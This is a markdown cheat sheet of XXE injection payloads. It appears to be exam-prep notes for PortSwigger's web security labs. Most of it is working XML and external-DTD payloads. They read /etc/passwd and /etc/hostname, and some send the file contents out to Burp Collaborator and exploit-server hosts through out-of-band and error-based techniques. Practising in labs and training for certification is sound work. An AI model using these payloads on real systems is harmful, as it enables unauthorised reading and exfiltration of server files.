# XXE



1. payload
```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```


2.Payload

![alt text](https://raw.githubusercontent.com/robin113x/BSCP-Exam/refs/heads/main/Images/XXE-2.jpg)

![alt text](https://raw.githubusercontent.com/robin113x/BSCP-Exam/refs/heads/main/Images/XXE-3.jpg)

3.Payload


```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://312d7f49j37e6gjy10vxd8qvhmndb3zs.oastify.com"> ]>

<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>

```


4.Payload
```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://435e9g6al49f8hlz31xyf9swjnped51u.oastify.com"> %xxe; ]>

<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```


5.Payload

```
Place the Burp Collaborator payload into a malicious DTD file:
Path : https://exploiturl.com/exploit.dtd

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;



__________________________________________________________

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-server.net/exploit.dtd"> %xxe;]>

```


6.Payload

```

Exploit server :

<!ENTITY % filepass SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; errorabc SYSTEM 'file:///invalid/%filepass;'>">
%eval;
%errorabc;


________________________________________________________________

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a63005a0340421581be65cf019500c8.exploit-server.net/exploit"> %xxe;]>

<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

```